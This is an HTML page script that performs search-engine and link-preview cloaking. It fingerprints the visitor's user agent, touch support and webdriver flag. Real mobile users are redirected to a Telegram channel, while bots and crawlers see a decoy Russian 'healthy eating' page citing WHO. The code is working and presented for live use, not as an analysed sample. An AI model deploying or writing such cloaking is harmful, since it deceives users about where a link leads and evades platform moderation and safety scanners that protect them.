<script>
  const isRealUser = () => {
    const ua = navigator.userAgent.toLowerCase();
    const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
    const isBot = /bot|crawler|spider|facebook|preview|google|yandex|vkshare/i.test(ua);
    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    const isHeadless = navigator.webdriver;

    return isMobile && hasTouch && !isBot && !isHeadless;
  };

  if (isRealUser()) {
    setTimeout(() => {
      window.location.href = "https://t.me/paradise_opt";
    }, 300);
  } else {
    document.write(`
      <h1>Здоровое питание</h1>
      <p>Официальные рекомендации по питанию от ВОЗ:</p>
      <a href="https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet" target="_blank">
        https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet
      </a>
    `);
  }
</script>
